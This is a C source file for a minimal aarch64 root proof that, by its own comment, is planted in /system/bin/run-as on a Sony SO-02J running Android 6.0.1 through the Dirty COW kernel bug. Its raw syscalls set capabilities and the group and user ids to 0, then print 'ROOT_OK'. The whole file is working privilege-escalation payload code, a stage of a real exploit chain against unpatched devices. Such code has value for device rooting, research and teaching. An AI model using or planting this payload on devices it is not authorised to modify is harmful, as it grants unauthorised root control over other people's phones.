/* Minimal aarch64 root proof for Sony SO-02J (Android 6.0.1, kernel 3.10.84).
 *
 * Written into /system/bin/run-as via Dirty COW. The file keeps its runas_exec
 * SELinux label, which is what grants CAP_SETUID/CAP_SETGID. Pure syscalls:
 * no libc, no dynamic linker, no Sony tad dependency, and no .bss (all state
 * lives on the stack - Android 6 mishandles a zero-FileSiz NOBITS LOAD).
 *
 * SELinux forbids the runas domain from executing shell_exec, so instead of
 * execve this prints uid/gid to stdout via write(1, ...) and exits.
 */
typedef unsigned long u64;

static long sys3(long n, long a, long b, long c) {
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0"
                     : "+r"(x0)
                     : "r"(x8), "r"(x1), "r"(x2)
                     : "memory");
    return x0;
}

struct cap_hdr { u64 version; int pid; };
struct cap_data { u64 effective; u64 permitted; u64 inheritable; };

static void put(char *msg, unsigned int *mlen, const char *s) {
    while (*s) msg[(*mlen)++] = *s++;
}
static void num(char *msg, unsigned int *mlen, long v) {
    char t[20]; int n = 0;
    if (v == 0) { msg[(*mlen)++] = '0'; return; }
    while (v > 0) { t[n++] = (char)('0' + v % 10); v /= 10; }
    while (n > 0) msg[(*mlen)++] = t[--n];
}

void _start(void) {
    struct cap_hdr h;
    struct cap_data d[2];
    char msg[128];
    unsigned int mlen = 0;
    long i;

    for (i = 0; i < (long)sizeof(h); ++i) ((char *)&h)[i] = 0;
    for (i = 0; i < (long)sizeof(d); ++i) ((char *)d)[i] = 0;
    h.version = 0x20080522;
    h.pid = 0;
    d[0].effective   = (1UL << 6) | (1UL << 7);  /* CAP_SETGID|CAP_SETUID */
    d[0].permitted   = (1UL << 6) | (1UL << 7);

    sys3(91 /*capset*/, (long)&h, (long)d, 0);
    sys3(159 /*setgroups*/, 0, 0, 0);
    sys3(149 /*setresgid*/, 0, 0, 0);
    sys3(147 /*setresuid*/, 0, 0, 0);

    put(msg, &mlen, "uid=");   num(msg, &mlen, sys3(174 /*getuid*/, 0, 0, 0));
    put(msg, &mlen, " euid="); num(msg, &mlen, sys3(175 /*geteuid*/, 0, 0, 0));
    put(msg, &mlen, " gid=");  num(msg, &mlen, sys3(176 /*getgid*/, 0, 0, 0));
    put(msg, &mlen, " egid="); num(msg, &mlen, sys3(177 /*getegid*/, 0, 0, 0));
    put(msg, &mlen, " pid=");  num(msg, &mlen, sys3(172 /*getpid*/, 0, 0, 0));
    put(msg, &mlen, " ROOT_OK\n");

    sys3(64 /*write*/, 1, (long)msg, mlen);
    sys3(93 /*exit*/, 0, 0, 0);
    for (;;) {}
}
